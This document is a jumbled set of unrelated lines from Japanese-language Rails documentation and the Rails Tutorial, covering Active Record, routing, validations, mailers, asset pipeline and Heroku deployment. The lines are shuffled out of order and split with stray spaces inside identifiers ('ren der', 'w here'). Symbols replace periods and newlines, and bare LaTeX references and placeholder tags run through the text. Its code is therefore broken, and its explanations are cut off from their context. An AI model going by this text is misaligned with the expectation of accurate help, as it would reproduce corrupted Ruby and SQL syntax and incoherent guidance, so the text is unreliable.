外部 参照 キー 参照 は 、 データベース レベル で の 制約 で す ▟ これ に よ っ て 、 Microposts テーブル の user_ id は 、 Users テーブル の id カラム を 参照 する よう に な り ま す 。
hidden_field_tag  'token' ,  ' VUBJKB 23 UIVI1UU 1 VOBVI @'
   Client ▖ created_before ( Time▖zone ▖now )
Another   routing  error ,  uninitialized  constant   Articles Controller ] ( images/getting _ started/ routing _error _no_controller▖ png )
永続 的 セッション の \ kode { current\ _user } を 更新 する  
$   heroku maintenance : on ╼$  git   push   heroku╼$   heroku run  rake   db : migrate╼$   heroku maintenance : off
`ren der ` で `: body ` オプション を 指定 する こと で 、 content type を 一切 指定 し な い 生 の コンテンツ を ブラウザ に 送信 する こと が でき ま す 。
最初 の 行 は 、 送信 さ れ た メール アドレス を 使用 し て 、 データベース から ユーザー を 取り出 し て い ま す 。
Ruby の 組み込 み クラス に は 配列 、 範囲 、 ハッシュ など が あ る
WARNING :   この メソッド を 呼び出 し て も 、 結合 レコード で コール バック は トリガ さ れ ま せ ん 。
上 の 正規 表現 を 使用 し て 属性 の 値 に 対 する バリデーション が 行 わ れ ま す 。
初歩 的 な 貢献 と し て 、 バグ レポート を 確認 する 作業 も 大変 役 に 立 ち ま す 。
コメント を 削除 する
< form   action = "/articles / 1 "   class = " button_to "   data - remote= " true "   method= " post " >
The  view  for   the   Help  page   with   full   HTML   structure▖  
###  フォーマッティング
基本 的 な 更新 の 方法 は 2 つ で す 。
  <%=  comment▖ commenter   %>
新し い マイクロ ポスト の 作成 ページ   ( \ href { http://local host : 3000 / microposts/new}{/microposts/new})
    has_and _belongs_to_many  : assemblies
//= require   jquery _ ujs
Date:    Thu  Oct   15   11 : 36 : 21   2009   - 0 7 0 0
self を 省略 し た 結果 を リスト \ ref{ code : password _ reset_edit_ action } に 示 し ま す 。
カスタマイズ し た い クラス は 、 前述 の ` User ` の よう な クラス ばかり と は 限 り ま せ ん 。
hwpcbmze ▖ herokuapp▖ com╼seyjhflo▖ herokuapp▖ com╼jhyicevg ▖ herokuapp▖ com
最初 に RailsCast 「 \ href { http://railscasts▖ com/episodes/206 - action - mailer - in - rails - 3 } { Rails   3 の Action   Mailer } 」 を 参照 し て くださ い 。
Rails プロジェクト で 使用 する \ kode { workspace } ディレクトリ を 作成 する ( クラウド の 場合 は 不要 ) 。
###  関連 付け られ た オブジェクト も 削除 する
Rails の 複数 形 化 メカニズム は 非常 に 強力 で 、 不 規則 な 語 で あ っ て も 複数 形 に し たり 単数 形 に し たり でき ま す ( person  <->  people など ) 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
1234 ▖ to_s(:human )               # =>  " 1 ▖ 23   Thousand "
###  Rails 全般 の 設定
|                     |   401                | :unauthorized                     |
さらに 前述 し た よう に 、 \ kode {match  ’/about ’ } と い う コード は 自動 的 に コントローラ と ビュー で 使用 する \emph { 名前 付き ルート } を 生成 し ま す 。
リスト \ ref{ code :length_ validation_test } で は 、 51 文字 の 文字 列 を 簡単 に 作 る ため に   “ 文字 列 の かけ算 ”   を 使 い ま し た 。
\ ref{ sec : sample_users } の サンプル データ 生成 タスク に マイクロ ポスト も 追加 し て 、 この 情けな い 状況 を 修正 し ま しょ う 。
ステータス フィード の 基本 的 な アイディア は シンプル で す 。
` has_many ` 関連 付け で は 以下 の オプション が サポート さ れ ま す 。
`object ` が 属 する クラス の メソッド 値 の 既存 の 戻 り 値 を コレクション に し た ` radio_button ` タグ を 返 し ま す 。
` app/views/blorgh/articles/index▖html ▖erb ` と い う ファイル を 作成 し て 以下 の コード を 追加 する と し ま す 。
ハッシュ も ` to_query ` に 応答 し ま す が 、 異な る シグネチャ を 使用 し ま す 。
以下 の 例文 で は you が 3 度 も 使用 さ れ て い る 。
これ で 、 少な く とも サイン イン の ルート を 追加 する まで の 間 、 リンク と 名前 付き ルート が 完成 し ま し た ( { 0 } { 1 } 第 8 章 { / 1 } { / 0 } ) 。
Java Script コード は Rails の あらゆる Web ページ で まる ごと バンドル さ れ ま す ▟ つまり 、 ページ が 最初 に ブラウザ に 読み込 ま れ る とき に ダウンロード さ れ 、 以後 は ブラウザ で キャッシュ さ れ ま す 。
{ 0 } 図   2 ▖ 2   { / 0 } { 1 } ユーザー の データ モデル { / 1 }
2 )   でき る だけ 念入り に Google で 検索 し 、 自分 が 調べ よう と し て い る トピック に 言及 し て い る ブログ や チュートリアル が な い か どう か 、 よく 探 す こと で す 。
## #  抽出
      <title ><%= @ page_title or   " Page  Title "  %></title >
実際 の インデックス ページ を 作成 する に は 、 ユーザー を 列挙 し て ユーザー ごと に \ kode { li } タグ で 囲 む ビュー を 作成 する 必要 が あ り ま す 。
これ で 、 ユーザー / マイクロ ポスト 関連 付け の 最終 形 が 完成 し ま し た ▟ すべて の テスト が パス する はず で す 。
作成 し た コード を リスト \ ref{ code :micropost _ partial_with_ delete } に 示 し ま す
上 の 例 の 場合 、 ` x ? ` と な り ま す 。
と い う こと で 再び これ まで と 同じ ジェネレータ を 使用 し て み ま しょ う 。
###  SanitizeHelper
実際 に 得 られ る 文字 列 は 、 ` ActiveSupport: :Multibyte: : Chars ` の インスタンス で ラップ さ れ て い ま す 。
<% @greeting   =   capture  do  %>
以後 本 ガイド で は 「 完全 な プラグ イン   ( full   plugin ) 」 を 単に 「 エンジン 」 と 呼 び ま す 。
実 は 、 Rails は 確か に Ruby で \emph { 書 か れ て } い ま す が 、 既に Ruby と は 別物 な の で す 。
      'X - XSS - Protection' =>   ' 1 ;   mode =block ' ,
     create
#   論理 値 テスト
しかし \ ref{ sec :finding _user_objects } で 既に 経験 済み の とおり 、 ユーザー ID が 存在 し な い 状態 で \ kode {find } を 使用 する と 例外 が 発生 し て しま い ま す 。
この メソッド は 、 レシーバ の 行 に インデント を 与え ま す 。
最も シンプル な Java Script を 例 に と っ て 考え て み ま しょ う 。
` app/assets/javascripts/application ▖js ` と い う マニフェスト の 内容 が 以下 の よう に な っ て い る と し ま す 。
どんな Rails アプリケーション も 最初 の 作成 手順 は 基本 的 に 同じ で す ▟ \ kode {rails   new } コマンド を 実行 し て 作成 し ま す 。
Rails ▖ application ▖ routes▖draw   do
評価 の 結果 は 、 \ kode { " foo" }  と  \ kode { " bar " }   を 足 し た \ kode { " foobar " } に な り ま し た
    has_many  : manifests
issue を 自分 の コンピュータ で 再現 でき る か どう か を 試 し て み ま しょ う 。
残念 で す が 、 この 場合 は ページ 分割 さ れ た フィード を 返 し て も うま く 動 き ま せ ん 。
今回 の StaticPages コントローラ に あ る メソッド は 、 以下 の よう に どちら も 最初 は 空 に な っ て い ま す 。
` Array ▖ deep_dup ` メソッド は 、 自分 自身 を 複製 する と 同時 に 、 その 中 の すべて の オブジェクト を Active   Support の `Object # deep_dup ` メソッド に よ っ て 再帰 的 に 複製 し ま す 。
Git ユーザー は これ まで 同様 新し い トピック ブランチ を 作成 し て くださ い 。
この 場合 、 `-%>` で タグ を 閉じ る こと は でき ま せ ん の で ご 注意 くださ い 。
メール を 送信 する
現 時点 で は 、 上 の コード の うち 、 以下 の コード だけ が 動作 し て い ま せ ん 。
最後 に 、 システム に よ っ て は 変更 を 反映 する ため に ターミナル で \ texttt { Ctrl - C } を 押 し て Web サーバー を 再 起動 する 必要 が 生じ る こと も あ り ま す
ユーザー の マイクロ ポスト に \ kode {dup } メソッド を 適用 する と 、 次 の よう な コード に な り ま す 。
カスタム の 例外 を ` : strict ` オプション に 追加 する こと も でき ま す 。
= >   [ 1 ,   4 ,   9 ,   16 ,   25 ]
タイトル で 埋め込 み Ruby を 使用 し た About ページ の ビュー
\emph { ヒント } :   リスト \ ref{ code :user_profile_test } の テスト に 追加 し て くださ い 。
メール アドレス の 長 さ に 対 する バリデーション も 、 次 の よう に 長 い 文字 列 を 作成 し て 検証 し ま す 。
*   : foreign_key
ユーザー 登録 で まず 初め に や る こと は 、 それ ら の 情報 を 保存 する ため の データ 構造 を 作成 する こと で す 。
ミックス イン 機能 を 使用 する こと で 、 CSS ルール の グループ を パッケージ 化 し て 複数 の 要素 に 適用 する こと が でき ま す ▟ たとえば 以下 の よう な 変換 を 行 い ま す 。
\ kode{gravatar _ for } ヘルパー に キー ワード 引数 を 追加 する
これ ら の ファイル は 頻繁 に 更新 さ れ る ため 、 バージョン 管理 に 含め る の は 何 か と 不便 で す 。
self を 省略 し た 結果 を リスト \ ref{ code : log _ in_with _remember } に 示 し ま す 。
###  config/initializers/wrap_parameters▖ rb
技術 的 に は 、 メール アドレス の うち ドメイン 名 部分 だけ が   ( 本当 は )   大 文字 小 文字 を 区別 し ま せ ん ▟ foo@bar▖ com は 、 本来 は dFoo@bar▖ com と は 別 の アドレス で す 。
デフォルト の エラー メッセージ は  _ " is   not  a   number " _  で す 。
その よう な 変更 が 行 わ れ 、 かつ 更新 が 無視 さ れ た 場合 、 ` ActiveRecord : : StaleObjectError ` 例外 が 発生 し ま す 。
` association▖nil ? ` メソッド を 使用 し て 、 関連 付け られ た オブジェクト が 存在 する か どう か を 確認 でき ま す 。
   collection   do
Ruby で は 、 あらゆる もの が オブジェクト で す ▟ 従 っ て 、 \ kode {nil } も オブジェクト で あ り 、 これ も 多く の メソッド に 応答 でき ま す 。
どちら の 方法 を 使用 し た 場合 で も 、 ` routes▖rb ` ファイル に 記載 さ れ た 順 に ルーティング が 表示 さ れ ま す 。
\emph { Rails チュートリアル } を 読 ん で い て 、 チュートリアル 内部 の 別 セクション 番号 へ の リンク を クリック し て 移動 し た ら 、 なるべく すぐ に 元 の 場所 に 戻 る こと を お 勧め し ま す 。
Cache - Control :  no- cache
get  '* pages',  to :  ' pages # show ',   format :  true
これ は つまり 、
フォント
Rack に 準拠 し た Web サーバー で 、 Rails アプリケーション を 提供 する に は 、 ` Rails ▖ application ` オブジェクト を 使用 する 必要 が あ り ま す 。
fixture 内 の 最初 の ユーザー を 管理 者 に する
登録 し て い な い 場合 は 、 上記 を 参照 し て 登録 し て お い て くださ い 。
/ db /*▖sqlite 3
<%=   form _ for (@ article ,   remote:  true )   do  | f| %>
SELECT   COUNT  (*)   AS   count_all ,  status   AS  status
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ name_error ▖ rb ` で す 。
それ と は 対照 的 に 、 Rails で ユーザー を モデリング する とき は 、 属性 を 明示 的 に 識別 する 必要 が あ り ま せ ん 。
   validates_with   MyValidator
\ ref{ sec : successful_ signups } で も 説明 し ま す が 、 ユーザー の 作成 で 重要 な の は \ kode { input } ごと に あ る 特殊 な \ kode { name } 属性 で す 。
     create_table : comments  do  | t |
` magazine_ad _ path ` を 使用 する と 、 id を 数字 で 渡 す 代り に ` Magazine ` と ` Ad ` の インスタンス を 引数 と し て 渡 す こと が でき ま す 。
\ kode {send } メソッド の 動作 原理 が わか っ た の で 、 それ に 基 い て \ kode {authenticated ? } メソッド を 書き換え ま す 。
    <td ><%=   link_to   " Edit " ,  edit_book _ path ( book )  %></td>
`titleize ` メソッド は ` titlecase ` の 別名 で す 。
<% =  ren der   partial :   " product " ,   collection : @products ,   as : :item % >
Rails の コントローラ は 、 デフォルト で は 正し い ルーティング に 対応 する 名前 を 持 つ ビュー を 自動 的 に 選 び 、 それ を 使用 し て レスポンス を 出力 し ま す 。
リスト \ ref{ code : demo_ users_controller } は 、 scaffold で 生成 し た コントローラ の 骨格 で す 。
The string   is   nonempty▖
   email_ with _ name  = %( "#{@user▖ name } "  <#{@user ▖email } >)
テスト ユーザー で ログ イン する  
Rails に あ る イニシャライザ の リスト を 以下 に まとめ ま し た ▟ これ ら は 定義 さ れ た 順序 で 並 ん で お り 、 特記 事項 の な い 限り 実行 さ れ ま す 。
編集 の 失敗 に 対 する テスト   { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
基本 タイトル と し て は これ で 正し い の で す が 、 末尾 に 余分 な 縦棒 \ kode {| } が 残 っ て しま っ て い ま す 。
` distinct ` メソッド は 、 コレクション 内 で 重複 が 発生 し な い よう に し ま す 。
  #  Rails   3 ▖ x
レシーバー から キー を 取り除 く 破壊 的 な ` except ! ` も あ り ま す 。
コマンド プロンプト の カーソル が ふたたび 表示 さ れ れ ば 、 サーバー は 停止 し て い ま す 。
now ▖all_day
この HTML の 細か い 部分 は ほとんど 私 たち の 目的 に は 関係 あ り ま せ ん が 、 この 構造 の 最も 重要 な 部分 に 注目 し て み ま しょ う 。
User モデル の 存在 確認 バリデーション の 結果
\ kode {User ▖ create ! } を 実行 する 前 に 、 Rake タスク が User モデル など の ローカル の Rails 環境 に アクセス でき る よう に し ま す 。
    Get  help  on  the   Ruby   on   Rails   Tutorial  at  the
= >  Action Controller : : Base
╼\end{ code }╼╼    \ subsection { データベース の 移行 }  %  ( fold) ╼    \ label{ sec : database_migrations }╼╼
この とき 、 この Rails アプリケーション の ルート ディレクトリ は 、 \ kode {config } ディレクトリ の 1 つ 上 の 階層 に あ り ま す ▟ したが っ て 、 以下 の 場所 が ルート ディレクトリ に な り ま す 。
上 で 生成 さ れ た ファイル を 見 る と わか る よう に 、 ビュー テンプレート ファイル は 基本 的 に コントローラ の アクション と 関連 付け られ て い ま す 。
これ ら の ファイル は 、 コントローラ 内 に あ る アクション ごと に 出力 さ れ た 結果 を ビュー で 表示 する ため に 使用 さ れ ま す 。
“ Home”   や  “ About ”   の よう な 静的 な ページ が な い
     video  =  self ▖arguments▖ first
これ は リスト \ ref{ code : close _route } で 使用 さ れ て い ま し た 。
\ kode { add\_ password\_digest\_to\_users } と い う マイグレーション ファイル を 生成 する ため に は 、 以下 の コマンド を 実行 し ま す 。
      <div  id= " menu " > Menu items   here < / div>
本番 環境   ( Web 上 )   で 実際 に ユーザー 登録 を し て み る
#   アセット で 読み込 ん だ 行 を 展開 する 。
    mattr_accessor   : logger
  ) ▖ on   " ajax: error " ,   ( e ,   xhr ,  status ,  error )   ->
= >   59
We’ll  add  user  edit/update   functionality  to  the   sample  application  in   Section   \ ref{ sec : updating _ users } ▖
データ の 検証 が 行 わ れ て い な い 。
これ に よ り 、 ` Marshal ` で シリアライズ さ れ た 既存 の cookies を 、 新し い ` JSON ` ベース の フォーマット に 透過 的 に 移行 でき ま す 。
`ren der ` メソッド で でき る 最も 単純 な 動作 は 、 何 も 出力 し な い こと で しょ う 。
####  コア 拡張 機能 を グループ 化 し て 読み込 む
この ブロック は 、 クライアント が 作成 さ れ る とき に だけ 実行 さ れ ま す 。
また 、 ルート URL の とき と 同様 に 、 \ kode {help\_ path } や \ kode {help\_url} と い っ た 名前 付き ルート も 使え る よう に な り ま す 。
この よう な 場合 、 特定 の メソッド の 振る舞い だけ で は な く 、  _ フレームワーク _   の 振る舞い も ドキュメント 化 する よう に し た い と 思 い ま す 。
get  'profile ' ,  to :   : show
結果 は { 0 } { 1 } 図 2 ▖ 13 { / 1 } { / 0 } の よう に な る はず で す 。
get  ': controller/: action/:id '
図 \ ref { fig :user_feed } に 、 サンプル の \ kode {microposts } データベース テーブル と 、 それ を フィード し た 結果 を 示 し ま す 。
\ kode { users } テーブル に 含 ま れ る データ の サンプル
self を 省略 し た 結果 を リスト \ ref{ code :user_ login_test _valid _ information } に 示 し ま す 。
Active   Record に は 、 返 さ れ た どの オブジェクト に 対 し て も 変更 を 明示 的 に 禁止 する ` readonly ` メソッド が あ り ま す 。
ユーザー 登録 失敗 時 の デバッグ 情報
following / follower ページ の テスト  
INFO :   Sass や Coffee Script など の 言語 を 使用 する 場合 は 、 必要 な ライブラリ を ` ▖ gemspec ` に 追加 する 必要 が あ り ま す 。
M ▖ parent_ name        # => " X : : Y "
       create    app/views/static _ pages/home▖html ▖erb
その モジュール の 中 に メソッド を 置 く こと で 準備 は 完了 し ま す 。
config▖ action_controller ▖ asset_host   =  ENV [ ' CDN _ HOST ' ]
つまり 、 この 場合 の 正し い 関係 は 以下 の よう に な り ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
たとえば 、 ` Client ▖ w here ( " first _ name  LIKE  '%#{ params [ : first _ name ] }%'" ) ` と い う 書 き 方 は 危険 で す 。
この コード の 効果 は 、 空 の テスト 用 データベース を 用意 し て User モデル の spec を 実行 する こと で 確認 でき ま す 。
この オプション は 、 エンジン を 削除 する 前 に マイグレーション を 元 に 戻 し た い 場合 など に 便利 で す 。
*   FROM   articles
TIP:   この オプション に よ る 変更 を すべて の ルーティング に 統一 的 に 適用 し た く な っ た 場合 は 、 スコープ を 使用 でき ま す 。
app/assets/javascripts/sub /something ▖ js
Rails コンソール で は 、 その 中 から コントローラ の アクション   ( 実 は メソッド )   を 呼 ぶ こと も でき ま す 。
Rails   2 以降 に お け る ビュー テンプレート の 標準 拡張 子 は 、 ERB   ( HTML   +  eMbedded  RuBy )   で レンダリング する 場合 は ` ▖erb ` 、 Builder   ( XML ジェネレータ )   で レンダリング する 場合 は `▖builder ` で す 。
ある ルーティング を 特定 の HTTP 動詞 に 割り当て る ため に 、 通常 は ` get ` 、 ` post ` 、 `put` 、 ` patch` 、 ` delete ` メソッド の いずれ か を 使用 する 必要 が あ り ま す 。
Home ページ で 動作 する ステータス フィード
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/numeric/bytes▖rb ` で す 。
この 実装 が 唯一 手間 の かか る 箇所 で す が 、 最新 の Rails で は \ kode { has_ secure_ password } を 使用 する だけ で これ ら の 機能 を すべて 自由 に 利用 でき ま す 。
time_zone _options _ for_select を 使用 し て オプション タグ を 生成 し 、 指定 さ れ た オブジェクト と メソッド 用 の select タグ と option タグ を 返 し ま す 。
この 後 、 Rails サーバー で ユーザー を メール アドレス で 検索 し て 有効 化 トークン を 認証 でき る よう に し た い の で 、 リンク に は メール アドレス と トークン を 両方 含め て お く 必要 が あ り ま す 。
上 の コード で は \ kode {pending } メソッド だけ が 置 か れ て お り 、 何 か 意味 の あ る コード で spec を 埋め る よう に 促 し て い ま す 。
本番 環境 で Rails を サブ ディレクトリ に デプロイ する と 、 Rails の 多く の 部分 に 影響 が 生 じ ま す 。
###  テスト ケース の 実行 順序
ActiveRecord : : Record NotFound :   Couldn't  find  User   with   ID=3
class   Notifier <  Action Mailer : : Base
` : allow_blank ` オプション は ` : allow_ nil ` オプション と 似 て い ま す 。
C ▖ subclasses # =>  [ B ,   D ]
悲観 的 ロック で は 、 データベース が 提供 する ロック 機構 を 使用 し ま す 。
  # email カラム を " login " と い う 名前 で も 参照 し た い
リスト \ ref{ code :micropost _validity_ test _ idiomatic } で 書 い た コード と 、 先ほど の ステップ が 結合 さ れ て い る 点 に 注意 し て くださ い 。
\ kode {each } メソッド を 使 っ て \ kode { addresses } 配列 の 各 要素 を 繰り返 し 取り出 し ま し た   ( \ ref{ sec :blocks} ) 。
   scope  : inactive ,  -> {  w here   state :  'inactive'  }
\ ref{ sec : the_status _feed } で は 、 ユーザー の ステータス フィード を 追加 し て 、 サンプル アプリケーション を 完成 さ せ ま す 。
    -> {  w here   factory :  ' Seattle'  }
####  Action   View を 出力 する
 * = require_tree   ▖
╼  #╼
=>  " USER @ EXAMPLE ▖ COM "
メソッド に は 、 バリデーション を トリガ する もの と 、 し な い もの が あ り ま す 。
      t ▖integer   : assembly_ id
ユーザー を フォロー する 機能 を 実装 する 第 一 歩 は 、 データ モデル を 構成 する こと で す ▟ ただし 、 これ は 見 た 目 ほど 単純 で は あ り ま せ ん 。
Client ▖ w here ( active :  true ) ▖ pluck(:id )
=> " dude@abides▖org "
この フォーム が 送信 さ れ る と 、 エンジン 内 の `/articles/: article _ id / comments ` と い う ルーティング に 対 し て ` POST ` リクエスト を 送信 し よう と し ま す 。
これ は リスト \ ref{ code : home_ page _feed_test } で 使用 さ れ て い ま し た 。
`un derscore ` メソッド は 上 と 逆 に 、 キャメル ケース を パス に 変換 し ま す 。
email = michael % 40 michaelhartl▖ com
beginning _ of_ hour  ( at_beginning _ of_ hour)
     PRI MARY  KEY    ( id )
#### ` dasherize`
ログ イン に 成功 すれ ば 、 \ kode {cookies } 内部 の \ kode {remember\_token } キー を 調べ る こと で 、 ユーザー が 保存 さ れ た か どう か を チェック でき る よう に な り ま す 。
SELECT  *  FROM   clients  LIMIT   2
最初 の ステップ と し て 、 マイクロ ポスト の パーシャル   ( リスト \ ref{ code :micropost _ partial } )   に 削除 リンク を 追加 し ま す 。
フレンド リー フォワーディング で 、 最初 に 与え られ た URL に のみ 確実 に 転送 さ れ て い る こと を 確認 する テスト を 作成 し て くださ い 。
{ 0 } 図 7 ▖ 16 { / 0 }   { 1 } ユーザー 登録 失敗 時 の デバッグ 情報 { / 1 }
再 設定 用 ダイジェスト は データベース に 保存 し て お き 、 再 設定 用 トークン は メール アドレス と 一緒 に 、 ユーザー に 送信 する 有効 化 用 メール の リンク に 仕込 ん で お く 。
#     <b type =" integer " > 2 < / b >
     w here ( " created_at > ? " ,   5 ▖ days ▖ ago)
` ( module | class) _eval ( 文字 列 ) ` メソッド で 作成 さ れ る メソッド に は 、 生成 さ れ た コード の インスタンス の そば に コメント が 置 か れ ま す 。
コントローラ は 、 ` Application Controller ` を 継承 する 形 で 定義 さ れ る シンプル な クラス で す 。
\ kode { spec/routing } ディレクトリ が 見つか ら な い と い う エラー が 表示 さ れ た 場合 は 、 以下 の よう に 空 の ディレクトリ を 作 る こと で 回避 でき ま す 。
{ 0 } 図 2 ▖ 12 { / 0 }   { 1 } 新し い マイクロ ポスト の 作成 ページ   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / microposts/new}{/microposts/new}) { / 1 }
リスト \ ref{ code : account_activation_preview } の プレビュー コード を 実装 する と 、 指定 の URL で アカウント 有効 化 メール を プレビュー でき る よう に な り ま す
s ▖html_safe ?  
" _ id " ▖ humanize                          # =>  " Id "
    unless :   Proc▖ new { | a | a ▖ password▖blank ?  
#   <object >
ren der   js:  " alert ( ' Hello   Rails') ; "
self を 省略 し た 結果 を リスト \ ref{ code :rails_new_ sample_app } に 示 し ま す 。
主要 な Unix コマンド 。
####   名前 付き ルーティング を 使用 し て URL を 生成 する
future ?
##### `utc`
|                     |  30 5                | :use_proxy                       |
メール を 受信 する
###  link_to
でき る だけ 多く の 関連 情報 を 含め る よう に し て くださ い ▟ また 、 少な く とも 問題 を 再現 でき る コード サンプル も 合わせ て 投稿 し て くださ い 。
Active   Support で は 、 ` attr_ internal _ reader` 、 ` attr_ internal _writer ` 、 ` attr_ internal _accessor ` と い う マクロ が 定義 さ れ て い ま す 。
\ ref{ sec :a_user_ tour } で 説明 し た とおり 、 id = \ kode { 1 } の ユーザー に アクセス する ため の ページ の URI は / users / 1 と な り ま す 。
TIP: `: id ` パラメータ で は ドット ` ▖ ` を デフォルト で は 使用 でき ま せ ん ▟ ドット は フォーマット 済み ルーティング で は 区切り 文字 と し て 使用 さ れ る ため で す 。
Time オブジェクト に 対 し て 期間 を 加減算 でき ま す 。
作成 する フォーム は 以下 の よう な 感じ に な り ま す 。
ユーザー 情報 を 編集 する パターン は 、 ( 第 \ ref { cha : sign_up } 章 ) の 新規 ユーザー の 作成 と 極めて 似通 っ て い ま す 。
merate}╼╼    %  subsection  mvc_ in_action   ( end ) ╼╼    \ subsection {Users リソース の 欠点 }  %  ( fold) ╼    \ label{ sec : weaknesses _of_this _users _ resource } ╼╼
development 環境 の 場合
データベース の インデックス
xml ▖em ( "emphasized " )
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/string/inflections ▖rb ` で す 。
Article▖ order ( 'id   asc') ▖ merge ( Article▖unscope(:order ) )
この 欠点 を 直 す ため に 、 画像 サイズ や フォーマット に 対 する バリデーション を 実装 し 、 サーバー 用 と クライアント   ( ブラウザ )   用 の 両方 に 追加 し ま しょ う 。
X : : Y▖ local _ constants # => [ : Y 1 , : X 1 ]
|                     |   405                | : method_ not_allowed              |
S 3 は 課金 サービス で す が 、 Rails チュートリアル の サンプル アプリケーション を セットアップ し たり テスト する だけ で あ れ ば 、 毎月 1 円 ほど しか 課金 さ れ ま せ ん 。
|  HTTP 動詞   |   パス              |  コントローラ # アクション   |   目的                                      |
本 ガイド は 、 ゼロ から Rails アプリケーション を 構築 し た い と 考え て い る 初心 者 を 対象 に し て い ま す 。
##### `: counter_cache`
今回 の テスト で は 、 \ kode { pagination } クラス を 持 っ た \ kode {div } タグ を チェック し て 、 最初 の ページ に ユーザー が い る こと を 確認 し ま す 。
ユーザー の 一覧 ページ は つい に 完了 し ま し た ▟ 残 る は \ kode { destroy } だけ で す ▟ これ を 実装 する こと で 、 REST に 準拠 し た 正統 な アプリケーション と な り ま す 。
Spork を 起動 する 前 に 、 以下 の よう に テスト スイート を 実行 し て 、 基準 と な る 実行 時間 を 測定 し ま す 。
続 い て 、 リモート リポジトリ と production サーバー に も プッシュ し ま す 。
` define _method ` を 使用 し て メソッド を 再 定義 する 必要 が あ る が 、 その 名前 が 既に あ る か どう か が わか ら な い とこ と が あ り ま す 。
\ ref{ sec :embedded_ruby } で は 最初 に ERb を 、 \ ref{ sec : sass } で は Sass を それぞれ 扱 い ま し た 。
次 に 、 自分 以外 の ユーザー の マイクロ ポスト は 削除 を し よう と する と 、 適切 に リダイレクト さ れ る こと を テスト で 確認 し ま す   ( リスト \ ref{ code :micropost _user_mismatch_test } ) 。
  = >   1
一見 奇妙 で す が 、 実行 方法 は 簡単 で す 。
` config▖ cache_classes ` が true の 場合 、 すべて の ` config▖ autoload _once_ paths ` 自動 読み込み は 一 度 しか 行 わ れ ま せ ん 。
# =>  Wed ,   0 8   Jun  2011   0 1 : 56 : 22   - 0 6 0 0
gem  'sass - rails '
この メソッド で 定義 さ れ て る 操作 は 取り消し が 可能 で す ▟ つまり 、 Rails は change メソッド で 行 わ れ た マイグレーション を 必要 に 応 じ て 元 に 戻 す こと が でき ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : sign _out_with _ forget } に 示 し ま す 。
これ に ともな い 、 コントローラ 名 、 モデル 名 、 テーブル 名 は いずれ も 名前 空間 化 さ れ ま す 。
use   ActionDispatch : : RequestId
サンプル データ に マイクロ ポスト を 追加 する
Rails   3 ▖ 0 以前 の バージョン で は 、 静的 ファイル は \ kode { public /} 以下 の 次 の ディレクトリ に 置 か れ て い ま し た 。
  #   新規 レコード 作成 時 に 、 数字 で な い 年齢 表現 を 使用 でき る
技術 的 に は 、 Rails は \ kode {un derscore } メソッド を 使用 し て クラス 名 を id に 変換 し て い ま す 。
123456 78 ▖ to_s(: delimited ,   delimiter :  " , " )      # = >  12 , 345 ,67 8
*  ` javascript_engine ` は 、 アセット 生成 時 に ( coffee など で ) 使用 する エンジン を 設定 し ま す 。
( The   MIT  License )
これ ら の メソッド を 使用 し た い 場合 は `# to_a ` を 呼び出 し て ` Array ` に 変更 し て から に し て くださ い 。
この チュートリアル 構成 は 、 Michael   Erasmus に よ る 素晴らし い ブログ 記事 「 5 分 で わか る Rails   3 の Asset   Pipeline   ( 英語 ) 」 を もと に し て い ま す 。
3 ▖ 5 ▖ gigabytes # = >   375 8 0 96 3 8 4
最初 に ` app/models/ comment ▖ rb ` を 見 て み ま しょ う 。
id \ kode { 1 } の マイクロ ポスト を 削除 する
次 に Heroku の アカウント を 新規 作成 し て 設定 し ま す 。
NOTE :   これ ら は すべて 同じ 定義 ファイル ` active_ support/core _ext/time/ calculations ▖rb ` に あ り ま す 。
#   名前 が David で 、 職業 が コードアーティスト の ユーザー を すべて 返 し 、 created_at カラム で 逆順 ソート する
       create      app/views/microposts/show ▖json▖jbuilder
Fri ,   31   Dec  2010   23 : 59 : 59   UTC   + 0 0 : 0 0
###  config/application ▖ rb
use   Rack : : Lock
    X 2   =   2
| lib /| アプリケーション で 使用 する 拡張 モジュール が 置 か れ ま す 。
ここ で Sass の \emph { ミックス イン } 機能   ( ここ で は \ kode { box_ sizing } )   を 使用 し て い ま す 。
` $ ` で 始ま る 記述 は コマンド 行 な の で 、 これ ら は コマンドライン に 入力 し て 実行 し て くださ い 。
` to_date` 、 ` to_time` 、 ` to_datetime` メソッド は 、 ` Date▖_parse ` を ラップ し て 使 い やす く し ま す 。
ユーザー と マイクロ ポスト の 自動 関連 付け が 行 わ れ て い な い
#   Run  specs in  random order   to   surface   order   dependencies▖
Sessions コントローラ の アクション は 、 これ まで も RESTful 慣例 に 従 っ て サイン イン ページ に は \ kode {new } を 使用 し 、 サイン イン の 完了 に は \ kode { create } を 使用 し ま し た 。
    has_many : comments ,  -> { order ( ' posted_at   DESC ')  }
{ 0 } 図 11 ▖ 13 { / 0 }   { 1 } 試作 フィード が あ る Home ページ の モックアップ { / 1 }
`initializer ` メソッド の ブロック 引数 は 、 アプリケーション 自身 の インスタンス で す ▟ その おかげ で 、 上 の 例 で 示 し た よう に 、 ` config ` メソッド を 使用 し て アプリケーション の 設定 に アクセス でき ま す 。
NOTE :   デフォルト の ` config ▖ assets▖digest ` オプション は 、 通常 は 変更 し な い で くださ い 。
以下 に 例 を 示 し ま す 。
この 画像 が 既に フィンガー プリント 付き で ` public/assets ` に あ れ ば 、 この パス に よ る 参照 は 有効 に な り ま す 。
    puts  " Called "
  <p ><%=  text _field_tag  ' name' %></p>
Action   Mailer ヘルパー を 使用 する
作成 さ れ る の は 通常 の ` < form >` な の で 、 ` form _ for ` に 関 する 情報 は すべて ` button_to ` に も 適用 でき ま す 。
これ ら の フィーチャー を 実行 する に は 、 \ kode { cucumber } 実行 ファイル を 以下 の よう に 実行 し ま す 。
さらに 、 \ kode {config/ database▖yml } ファイル と 、 Postgre SQL を ローカル 環境 で 動作 さ せ る 方法 を 学 ぶ 必要 が あ り ま す 。
Ajax を 使 っ た フォロー 解除 フォーム
デフォルト の ` config▖ active_ support▖bare ` が 信用 でき な い 場合 に は ` active_ support/all ` も 必要 で す 。
